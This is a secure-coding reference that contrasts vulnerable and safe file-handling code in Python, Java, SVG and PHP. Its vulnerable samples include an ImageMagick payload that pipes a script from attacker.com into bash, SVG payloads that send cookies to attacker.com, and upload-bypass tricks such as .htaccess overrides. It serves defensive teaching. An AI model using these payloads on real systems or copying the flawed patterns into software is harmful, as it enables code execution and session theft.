# Vulnerable File Handling Patterns by Language/Framework

## Python

### Zip Slip — extractall without path check
```python
# VULNERABLE: entries can escape the extraction directory
import zipfile

def extract_archive(zip_path, dest_dir):
    with zipfile.ZipFile(zip_path, 'r') as zf:
        zf.extractall(dest_dir)  # zip entry "../../etc/cron.d/evil" writes outside dest_dir

# SAFE: check each entry
import os

def safe_extract(zip_path, dest_dir):
    dest_dir = os.path.abspath(dest_dir)
    with zipfile.ZipFile(zip_path, 'r') as zf:
        for member in zf.namelist():
            member_path = os.path.abspath(os.path.join(dest_dir, member))
            if not member_path.startswith(dest_dir + os.sep):
                raise ValueError(f"Zip slip detected: {member}")
            zf.extract(member, dest_dir)
```

### Tar Slip — tarfile.extractall (Python < 3.12)
```python
# VULNERABLE: tarfile.extractall() follows symlinks and absolute paths
import tarfile

with tarfile.open('archive.tar.gz', 'r:gz') as tf:
    tf.extractall('/var/uploads/')  # dangerous until Python 3.12 filter param

# SAFE (Python 3.12+)
with tarfile.open('archive.tar.gz', 'r:gz') as tf:
    tf.extractall('/var/uploads/', filter='data')  # strips dangerous entries

# SAFE (Python < 3.12) — manual check
def safe_tar_extract(tf, dest):
    for member in tf.getmembers():
        member_path = os.path.realpath(os.path.join(dest, member.name))
        if not member_path.startswith(os.path.realpath(dest)):
            raise ValueError(f"Tar slip: {member.name}")
    tf.extractall(dest)
```

### Extension-Only Validation (Bypassable)
```python
# VULNERABLE: checks extension but not magic bytes or MIME
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif'}

def upload_file(f):
    ext = os.path.splitext(f.filename)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return "Invalid file type"
    f.save(os.path.join(UPLOAD_FOLDER, f.filename))
    # Bypass: rename PHP file to "shell.php.jpg" on some servers
    # Or: upload "shell.php%00.jpg" (null byte truncation on older PHP)

# SAFE: check magic bytes
import magic

def upload_file_safe(f):
    data = f.read(2048)
    f.seek(0)
    mime = magic.from_buffer(data, mime=True)
    if mime not in {'image/jpeg', 'image/png', 'image/gif'}:
        return "Invalid file type"
    filename = werkzeug.utils.secure_filename(f.filename)
    f.save(os.path.join(UPLOAD_FOLDER, filename))
```

### ImageMagick Processing Without Policy
```python
# VULNERABLE: ImageMagick processes user-supplied file, no policy.xml restriction
import subprocess

def convert_image(input_path, output_path):
    subprocess.run(['convert', input_path, output_path], check=True)
    # Attacker uploads file with content:
    # push graphic-context
    # viewbox 0 0 640 480
    # fill 'url(https://attacker.com/|id; curl attacker.com/shell.sh | bash)'
    # pop graphic-context
```

### Temporary File Race (mktemp vs mkstemp)
```python
# VULNERABLE: mktemp() creates temp filename WITHOUT creating the file
import tempfile, os

tmp_path = tempfile.mktemp(suffix='.py')  # returns /tmp/tmpXXXXXX.py (not created yet)
# TOCTOU window: attacker can create /tmp/tmpXXXXXX.py as a symlink
# before our code opens it for writing
with open(tmp_path, 'w') as f:
    f.write(user_code)
os.system(f'python3 {tmp_path}')  # executes attacker's symlink target

# SAFE: mkstemp() atomically creates AND opens the file
fd, tmp_path = tempfile.mkstemp(suffix='.py')
with os.fdopen(fd, 'w') as f:
    f.write(user_code)
```

## Java

### Zip Slip — ZipEntry.getName() without path check
```java
// VULNERABLE
public void extractZip(ZipFile zip, File destDir) throws IOException {
    Enumeration<? extends ZipEntry> entries = zip.entries();
    while (entries.hasMoreElements()) {
        ZipEntry entry = entries.nextElement();
        File file = new File(destDir, entry.getName());  // entry.getName() = "../../etc/passwd"
        // file now points OUTSIDE destDir
        try (InputStream is = zip.getInputStream(entry)) {
            Files.copy(is, file.toPath(), StandardCopyOption.REPLACE_EXISTING);
        }
    }
}

// SAFE
public void extractZip(ZipFile zip, File destDir) throws IOException {
    Enumeration<? extends ZipEntry> entries = zip.entries();
    while (entries.hasMoreElements()) {
        ZipEntry entry = entries.nextElement();
        File file = new File(destDir, entry.getName());
        String canonicalDest = destDir.getCanonicalPath() + File.separator;
        String canonicalFile = file.getCanonicalPath();
        if (!canonicalFile.startsWith(canonicalDest)) {
            throw new SecurityException("Zip slip detected: " + entry.getName());
        }
        // safe to extract
    }
}
```

## SVG XSS Patterns

### Stored XSS via uploaded SVG served same-origin
```xml
<!-- attacker uploads this as profile-picture.svg -->
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/steal?c='+document.cookie)">
  <circle cx="50" cy="50" r="50" fill="red"/>
</svg>
```

```xml
<!-- Alternative: embedded script tag -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    document.location = 'https://attacker.com/steal?c=' + document.cookie;
  </script>
</svg>
```

### Conditions for exploitability
- File must be served from SAME origin as the web app (not a CDN like `static.target.com`)
- Content-Type must be `image/svg+xml` (not `application/octet-stream`)
- Browser must render it (direct URL visit or `<img>` tag — `<img>` is safe, `<iframe src="...svg">` executes JS)
- If served with `Content-Disposition: attachment` → download only, not XSS

## PHP File Upload Bypass

```php
// VULNERABLE: checks MIME type from $_FILES, which comes from browser (user-controlled)
if ($_FILES['file']['type'] === 'image/jpeg') {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}
// Bypass: set Content-Type: image/jpeg in the multipart upload for a PHP file

// Also vulnerable: .htaccess upload to override execution rules
// Upload a .htaccess with: AddType application/x-httpd-php .jpg
// Then upload shell.jpg with PHP code — server executes it as PHP
```
